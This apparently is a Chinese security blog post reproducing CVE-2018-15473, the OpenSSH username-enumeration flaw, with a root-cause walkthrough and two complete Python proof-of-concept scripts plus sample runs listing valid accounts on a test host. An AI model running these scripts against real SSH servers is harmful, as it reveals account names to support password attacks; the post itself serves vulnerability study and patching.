<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="（CVE-2018-15473）OpenSSH 用户枚举漏洞一、漏洞简介OpenSSH（OpenBSD安全外壳）是OpenBSD计划组的一套用于安全访问远程计算机的连接工具。该工具是SSH协议的开源实现，支持对所有的传输进行加密，可有效阻止窃听，连接劫持以及其他网络级OpenSSH7.7及之前版本中存在信息中断。该漏洞源于网络系统或产品在运行过程中存在配置等错误。未授权的攻击者可以利用入侵获取组件">
<meta property="og:type" content="article">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/OpenSSH/%EF%BC%88CVE-2018-15473%EF%BC%89OpenSSH%20%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:description" content="（CVE-2018-15473）OpenSSH 用户枚举漏洞一、漏洞简介OpenSSH（OpenBSD安全外壳）是OpenBSD计划组的一套用于安全访问远程计算机的连接工具。该工具是SSH协议的开源实现，支持对所有的传输进行加密，可有效阻止窃听，连接劫持以及其他网络级OpenSSH7.7及之前版本中存在信息中断。该漏洞源于网络系统或产品在运行过程中存在配置等错误。未授权的攻击者可以利用入侵获取组件">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId24.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId25.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId26.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId27.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId28.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId29.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId30.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId31.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId32.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId33.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId34.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId35.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId36.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId37.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId38.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId39.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId40.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId41.png">
<meta property="article:published_time" content="2022-07-08T06:26:00.790Z">
<meta property="article:modified_time" content="2022-07-08T07:24:51.404Z">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://she11c0de.github.io/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId24.png">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-OpenSSH/（CVE-2018-15473）OpenSSH 用户枚举漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/OpenSSH/%EF%BC%88CVE-2018-15473%EF%BC%89OpenSSH%20%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:26:00.790Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2018-15473）OpenSSH-用户枚举漏洞"><a href="#（CVE-2018-15473）OpenSSH-用户枚举漏洞" class="headerlink" title="（CVE-2018-15473）OpenSSH 用户枚举漏洞"></a>（CVE-2018-15473）OpenSSH 用户枚举漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>OpenSSH（OpenBSD安全外壳）是OpenBSD计划组的一套用于安全访问远程计算机的连接工具。该工具是SSH协议的开源实现，支持对所有的传输进行加密，可有效阻止窃听，连接劫持以及其他网络级OpenSSH<br>7.7及之前版本中存在信息中断。该漏洞源于网络系统或产品在运行过程中存在配置等错误。未授权的攻击者可以利用入侵获取组件敏感信息。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>OpenSSH &lt; 7.7</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>这个漏洞存在于OpenSSH所实现的一些认证功能之中，首先我们一起看一看Ubuntu<br>OpenSSH的公共密钥认证漏洞。</p>
<p>通过向一台OpenSSH服务器发送恶意的公共密钥认证消息，攻击者将能够获取特定的用户名信息。如果用户不存在，服务器将会向客户端发送认证失败的消息。如果用户存在，消息将无法解析并终止通信，即通信连接会在没有任何消息回传的情况下断开。关于该漏洞的漏洞利用代码可以从这个Python<br>PoC脚本中获取：</p>
<blockquote>
<p>pip2 install --upgrade paramiko==2.4.1</p>
<p>pip2 install paramiko</p>
</blockquote>
<pre><code>#!/usr/bin/env python

# Copyright (c) 2018 Matthew Daley
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the &quot;Software&quot;), to
# deal in the Software without restriction, including without limitation the
# rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
# sell copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
# FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
# IN THE SOFTWARE.


import argparse
import logging
import paramiko
import socket
import sys


class InvalidUsername(Exception):
    pass


def add_boolean(*args, **kwargs):
    pass


old_service_accept = paramiko.auth_handler.AuthHandler._handler_table[
        paramiko.common.MSG_SERVICE_ACCEPT]

def service_accept(*args, **kwargs):
    paramiko.message.Message.add_boolean = add_boolean
    return old_service_accept(*args, **kwargs)


def userauth_failure(*args, **kwargs):
    raise InvalidUsername()


paramiko.auth_handler.AuthHandler._handler_table.update(&#123;
    paramiko.common.MSG_SERVICE_ACCEPT: service_accept,
    paramiko.common.MSG_USERAUTH_FAILURE: userauth_failure
&#125;)

logging.getLogger(&#39;paramiko.transport&#39;).addHandler(logging.NullHandler())

arg_parser = argparse.ArgumentParser()
arg_parser.add_argument(&#39;hostname&#39;, type=str)
arg_parser.add_argument(&#39;--port&#39;, type=int, default=22)
arg_parser.add_argument(&#39;username&#39;, type=str)
args = arg_parser.parse_args()

sock = socket.socket()
try:
    sock.connect((args.hostname, args.port))
except socket.error:
    print &#39;[-] Failed to connect&#39;
    sys.exit(1)

transport = paramiko.transport.Transport(sock)
try:
    transport.start_client()
except paramiko.ssh_exception.SSHException:
    print &#39;[-] Failed to negotiate SSH transport&#39;
    sys.exit(2)

try:
    transport.auth_publickey(args.username, paramiko.RSAKey.generate(2048))
except InvalidUsername:
    print &#39;[*] Invalid username&#39;
    sys.exit(3)
except paramiko.ssh_exception.AuthenticationException:
    print &#39;[+] Valid username&#39;
</code></pre>
<p>这个漏洞之所以存在，是因为服务器在对消息完整解析之前，用户查询了不存在的用户名。想要修复该漏洞也很简单，按攻击逻辑反着来就行了：首先对消息进行完整解析，然后再建立通信连接。</p>
<p>测试漏洞利用PoC的一种方法就是在调试模式下开启OpenSSH服务器：</p>
<p><img src="/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
<p>然后用已存在的有效用户名运行PoC脚本：</p>
<p><img src="/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
<p>在服务器端将会查看到错误提示：</p>
<p><img src="/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
<p>相关错误信息还可以在/var/log/auth.log中找到：</p>
<p><img src="/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId27.png"></p>
<p>如果无法正确解析消息，会导致客户端跟服务器端之间的通信中断，而且中断时不会收到服务器发送的提示信息：</p>
<p><img src="/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId28.png"></p>
<p>注意粉红色标记的最后一个数据包（客户端数据包），这里没有后续的蓝色数据包（服务器数据包）。</p>
<p>当PoC脚本以不存在的用户名运行之后：</p>
<p><img src="/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId29.png"></p>
<p>不会弹出”imcomplete message”错误提示：</p>
<p><img src="/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId30.png"></p>
<p><img src="/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId31.png"></p>
<p>注意通信数据结尾处的蓝色服务器数据包。</p>
<p>这就是该漏洞（公共密钥认证漏洞）暴露有效用户名的整个流程了。</p>
<p>其中，userauth_pubkey函数是认证功能所实现的其中一个函数，专门用于根据公共密钥来完成身份验证。如果认证失败，则返回”0”，成功则返回”1”。当服务器端接收到了SSH2_MSG_USERAUTH_REQUEST请求后，便会调用该函数，之后的结果会用来给客户端回传SSH2_MSG_USERAUTH_FAILURE或SSH2_MSG_USERAUTH_SUCCESS消息。</p>
<p><img src="/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId32.png"></p>
<p>该函数的运行逻辑为：</p>
<blockquote>
<p>\1. 如果用户名不存在：返回”0”；</p>
<p>\2. 如果用户名存在但密钥错误：返回”0”；</p>
<p>\3. 如果用户名存在且密钥正确：返回”1”；</p>
</blockquote>
<p>但是有人发现，我们竟然可以在第一步和第二步中间终止userauth_pubkey函数的运行。第一步执行完后，userauth_pubkey函数会从客户端获取消息字符串，如果获取失败（恶意字符串导致），整个过程都会终止，并在不发送任何回传消息的情况下关闭连接。</p>
<p>packet_get_string所导致的情况如下：</p>
<p><img src="/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId33.png"></p>
<p>如果用户名存在，第一步会在程序从消息域中提取完数据后进行。</p>
<p>第一个提取的数据域是一个布尔值（1字节），对应函数为packet_get_char()。如果认证类型为publickey，返回值就是”1”。后续跟着的是两个字符串：算法和密钥。在SSH消息中，字符串会以一个”长度-值”键值对进行编码，一个字符串为4个字节。</p>
<p>函数packet_get_string可以从消息中提取字符串，并对其进行验证，这个函数还需要依赖另一个函数：ssh_ssh_packet_get_string。</p>
<p><img src="/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId34.png"></p>
<p>ssh_packet_get_string函数会调用sshpkt_get_string函数，如果返回的值不是”0”，它还会调用fatal函数。函数fatal会记录致命的错误事件，然后终止生成的OpenSSH进程（不回传任何错误信息）。</p>
<p><img src="/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId35.png"></p>
<p>接下来会执行sshpkt_get_string函数并调用sshbuf_get_string函数：</p>
<p><img src="/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId36.png"></p>
<p>然后sshbuf_get_string函数会调用sshbuf_get_string_direct：</p>
<p><img src="/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId37.png"></p>
<p>然后sshbuf_get_string_direct会调用sshbuf_peek_string_direct:</p>
<p><img src="/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId38.png"></p>
<p>最后，sshbuf_peek_string_direct会进行字符串验证：</p>
<p><img src="/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId39.png"></p>
<p>如果消息中剩余数据小于4字节，或者说消息中的剩余数据小于字符串长度，则会返回SSH_ERR_MESSAGE_INCOMPLETE<br>错误消息。这就是我们之前那个Python<br>PoC脚本所要触发的东西。首先，它会跟OpenSSH服务器建立一条加密的通信链接，然后向其发送恶意的SSH2_MSG_USERAUTH_REQUEST消息。通过重定义add_boolean函数，消息中的布尔值域会被忽略。</p>
<p>当函数userauth_pubkey解析了恶意消息之后，首先会读取布尔值域，由于这个域其实是不存在的，因此读取的会是下一个域（函数packet_get_char）：加密算法字符串的4字节长度值。然后调用下一个函数packet_get_string来读取加密算法字符串。</p>
<p>下面是解析合法消息的过程：</p>
<p><img src="/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId40.png"></p>
<p>下面是解析恶意消息的过程：</p>
<p><img src="/resource/(CVE-2018-15473)OpenSSH%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/media/rId41.png"></p>
<p>结果就是，代码解析了一个1907字节的字符串（十六进制为0×00000773），这比整个消息的长度还要长，这会导致ssh_packet_get_string调用fatal函数，并中断OpenSSH进程。</p>
<h3 id="poc补充"><a href="#poc补充" class="headerlink" title="poc补充"></a>poc补充</h3><blockquote>
<p>不知道为什么上面那个poc运行就报错了。这里找了一个能用的poc</p>
</blockquote>
<h2 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h2><blockquote>
<p>A single username</p>
</blockquote>
<pre><code>(cve-2018-15473)─&gt; ./ssh-username-enum.py -u epi 192.168.1.2
[+] epi found!
</code></pre>
<blockquote>
<p>Use a wordlist with 10 threads (the default is 4)</p>
</blockquote>
<pre><code>(cve-2018-15473)─&gt; ./ssh-username-enum.py -t 10 -w /usr/share/metasploit-framework/data/wordlists/unix_users.txt 192.168.1.2
[+] avahi found!
[+] avahi-autoipd found!
[+] backup found!
[+] daemon found!
[+] bin found!
------8&lt;------
</code></pre>
<blockquote>
<p>IPv6 Address on port 2222 and INCREASED VERBOSITY!</p>
</blockquote>
<pre><code>(cve-2018-15473)─&gt; ./ssh-username-enum.py -6 -p 2222 -v -w /usr/share/metasploit-framework/data/wordlists/unix_users.txt &#39;::1&#39;
[-] 4Dgifts not found
[-] demo not found
[-] checkfs not found
[-] anon not found
[-] EZsetup not found
[-] auditor not found
[-] demos not found
[-] OutOfBox not found
[-] checkfsys not found
[+] avahi found!
[-] diag not found
[-] ROOT not found
[-] checksys not found
[-] cmwlogin not found
[+] avahi-autoipd found!
------8&lt;------
</code></pre>
<blockquote>
<p><strong>requirements.txt</strong></p>
<p>asn1crypto==0.24.0&gt; bcrypt==3.1.4&gt; cffi==1.11.5&gt; cryptography==2.3.1&gt; idna==2.7&gt; paramiko==2.4.1&gt; pyasn1==0.4.4&gt; pycparser==2.18&gt; PyNaCl==1.2.1&gt; six==1.11.0</p>
</blockquote>
<pre><code>#!/usr/bin/env python3
&quot;&quot;&quot;
derived from work done by Matthew Daley
https://bugfuzz.com/stuff/ssh-check-username.py
props to Justin Gardner for the add_boolean workaround
CVE-2018-15473
--------------
OpenSSH through 7.7 is prone to a user enumeration vulnerability due to not delaying bailout for an
invalid authenticating user until after the packet containing the request has been fully parsed, related to
auth2-gss.c, auth2-hostbased.c, and auth2-pubkey.c.
Author: epi
    https://epi052.gitlab.io/notes-to-self/
    https://gitlab.com/epi052/cve-2018-15473
&quot;&quot;&quot;
import sys
import re
import socket
import logging
import argparse
import multiprocessing
from typing import Union
from pathlib import Path

import paramiko

assert sys.version_info &gt;= (3, 6), &quot;This program requires python3.6 or higher&quot;


class Color:
    &quot;&quot;&quot; Class for coloring print statements.  Nothing to see here, move along. &quot;&quot;&quot;
    BOLD = &#39;\033[1m&#39;
    ENDC = &#39;\033[0m&#39;
    RED = &#39;\033[38;5;196m&#39;
    BLUE = &#39;\033[38;5;75m&#39;
    GREEN = &#39;\033[38;5;149m&#39;
    YELLOW = &#39;\033[38;5;190m&#39;

    @staticmethod
    def string(string: str, color: str, bold: bool = False) -&gt; str:
        &quot;&quot;&quot; Prints the given string in a few different colors.
        Args:
            string: string to be printed
            color:  valid colors &quot;red&quot;, &quot;blue&quot;, &quot;green&quot;, &quot;yellow&quot;
            bold:   T/F to add ANSI bold code
        Returns:
            ANSI color-coded string (str)
        &quot;&quot;&quot;
        boldstr = Color.BOLD if bold else &quot;&quot;
        colorstr = getattr(Color, color.upper())
        return f&#39;&#123;boldstr&#125;&#123;colorstr&#125;&#123;string&#125;&#123;Color.ENDC&#125;&#39;


class InvalidUsername(Exception):
    &quot;&quot;&quot; Raise when username not found via CVE-2018-15473. &quot;&quot;&quot;


def apply_monkey_patch() -&gt; None:
    &quot;&quot;&quot; Monkey patch paramiko to send invalid SSH2_MSG_USERAUTH_REQUEST.
        patches the following internal `AuthHandler` functions by updating the internal `_handler_table` dict
            _parse_service_accept
            _parse_userauth_failure
        _handler_table = &#123;
            MSG_SERVICE_REQUEST: _parse_service_request,
            MSG_SERVICE_ACCEPT: _parse_service_accept,
            MSG_USERAUTH_REQUEST: _parse_userauth_request,
            MSG_USERAUTH_SUCCESS: _parse_userauth_success,
            MSG_USERAUTH_FAILURE: _parse_userauth_failure,
            MSG_USERAUTH_BANNER: _parse_userauth_banner,
            MSG_USERAUTH_INFO_REQUEST: _parse_userauth_info_request,
            MSG_USERAUTH_INFO_RESPONSE: _parse_userauth_info_response,
        &#125;
    &quot;&quot;&quot;

    def patched_add_boolean(*args, **kwargs):
        &quot;&quot;&quot; Override correct behavior of paramiko.message.Message.add_boolean, used to produce malformed packets. &quot;&quot;&quot;

    auth_handler = paramiko.auth_handler.AuthHandler
    old_msg_service_accept = auth_handler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]

    def patched_msg_service_accept(*args, **kwargs):
        &quot;&quot;&quot; Patches paramiko.message.Message.add_boolean to produce a malformed packet. &quot;&quot;&quot;
        old_add_boolean, paramiko.message.Message.add_boolean = paramiko.message.Message.add_boolean, patched_add_boolean
        retval = old_msg_service_accept(*args, **kwargs)
        paramiko.message.Message.add_boolean = old_add_boolean
        return retval

    def patched_userauth_failure(*args, **kwargs):
        &quot;&quot;&quot; Called during authentication when a username is not found. &quot;&quot;&quot;
        raise InvalidUsername(*args, **kwargs)

    auth_handler._client_handler_table.update(&#123;
        paramiko.common.MSG_SERVICE_ACCEPT: patched_msg_service_accept,
        paramiko.common.MSG_USERAUTH_FAILURE: patched_userauth_failure
    &#125;)


def create_socket(hostname: str, port: int) -&gt; Union[socket.socket, None]:
    &quot;&quot;&quot; Small helper to stay DRY.
    Returns:
        socket.socket or None
    &quot;&quot;&quot;
    # spoiler alert, I don&#39;t care about the -6 flag, it&#39;s really
    # just to advertise in the help that the program can handle ipv6
    try:
        return socket.create_connection((hostname, port))
    except socket.error as e:
        print(f&#39;socket error: &#123;e&#125;&#39;, file=sys.stdout)


def connect(username: str, hostname: str, port: int, verbose: bool = False, **kwargs) -&gt; None:
    &quot;&quot;&quot; Connect and attempt keybased auth, result interpreted to determine valid username.
    Args:
        username:   username to check against the ssh service
        hostname:   hostname/IP of target
        port:       port where ssh is listening
        key:        key used for auth
        verbose:    bool value; determines whether to print &#39;not found&#39; lines or not
    Returns:
        None
    &quot;&quot;&quot;
    sock = create_socket(hostname, port)
    if not sock:
        return

    transport = paramiko.transport.Transport(sock)

    try:
        transport.start_client()
    except paramiko.ssh_exception.SSHException:
        return print(Color.string(f&#39;[!] SSH negotiation failed for user &#123;username&#125;.&#39;, color=&#39;red&#39;))

    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(1024))
    except paramiko.ssh_exception.AuthenticationException:
        print(f&quot;[+] &#123;Color.string(username, color=&#39;yellow&#39;)&#125; found!&quot;)
    except InvalidUsername:
        if not verbose:
            return
        print(f&#39;[-] &#123;Color.string(username, color=&quot;red&quot;)&#125; not found&#39;)


def main(**kwargs):
    &quot;&quot;&quot; main entry point for the program &quot;&quot;&quot;
    sock = create_socket(kwargs.get(&#39;hostname&#39;), kwargs.get(&#39;port&#39;))
    if not sock:
        return

    banner = sock.recv(1024).decode()

    regex = re.search(r&#39;-OpenSSH_(?P&lt;version&gt;\d\.\d)&#39;, banner)
    if regex:
        try:
            version = float(regex.group(&#39;version&#39;))
        except ValueError:
            print(f&#39;[!] Attempted OpenSSH version detection; version not recognized.\n[!] Found: &#123;regex.group(&quot;version&quot;)&#125;&#39;)
        else:
            ver_clr = &#39;green&#39; if version &lt;= 7.7 else &#39;red&#39;
            print(f&quot;[+] &#123;Color.string(&#39;OpenSSH&#39;, color=ver_clr)&#125; version &#123;Color.string(version, color=ver_clr)&#125; found&quot;)
    else:
        print(f&#39;[!] Attempted OpenSSH version detection; version not recognized.\n[!] Found: &#123;Color.string(banner, color=&quot;yellow&quot;)&#125;&#39;)    

    apply_monkey_patch()

    if kwargs.get(&#39;username&#39;):
        kwargs[&#39;username&#39;] = kwargs.get(&#39;username&#39;).strip()
        return connect(**kwargs)

    with multiprocessing.Pool(kwargs.get(&#39;threads&#39;)) as pool, Path(kwargs.get(&#39;wordlist&#39;)).open() as usernames:
        host = kwargs.get(&#39;hostname&#39;)
        port = kwargs.get(&#39;port&#39;)
        verbose = kwargs.get(&#39;verbose&#39;)
        pool.starmap(connect, [(user.strip(), host, port, verbose) for user in usernames])


if __name__ == &#39;__main__&#39;:
    parser = argparse.ArgumentParser(description=&quot;OpenSSH Username Enumeration (CVE-2018-15473)&quot;)

    parser.add_argument(&#39;hostname&#39;, help=&#39;target to enumerate&#39;, type=str)
    parser.add_argument(&#39;-p&#39;, &#39;--port&#39;, help=&#39;ssh port (default: 22)&#39;, default=22, type=int)
    parser.add_argument(&#39;-t&#39;, &#39;--threads&#39;, help=&quot;number of threads (default: 4)&quot;, default=4, type=int)
    parser.add_argument(&#39;-v&#39;, &#39;--verbose&#39;, action=&#39;store_true&#39;, default=False,
                        help=&quot;print both valid and invalid usernames (default: False)&quot;)
    parser.add_argument(&#39;-6&#39;, &#39;--ipv6&#39;, action=&#39;store_true&#39;, help=&quot;Specify use of an ipv6 address (default: ipv4)&quot;)

    multi_or_single_group = parser.add_mutually_exclusive_group(required=True)
    multi_or_single_group.add_argument(&#39;-w&#39;, &#39;--wordlist&#39;, type=str, help=&quot;path to wordlist&quot;)
    multi_or_single_group.add_argument(&#39;-u&#39;, &#39;--username&#39;, help=&#39;a single username to test&#39;, type=str)

    args = parser.parse_args()

    logging.getLogger(&#39;paramiko.transport&#39;).addHandler(logging.NullHandler())

    main(**vars(args))
</code></pre>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/184583.html">https://www.freebuf.com/vuls/184583.html</a></p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/OpenSSH/%EF%BC%88CVE-2018-15473%EF%BC%89OpenSSH%20%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qti700d4y8v15d9aenjj" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/07/07/OpenSSH/%EF%BC%88CVE-2020-15778%EF%BC%89OpenSSH%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
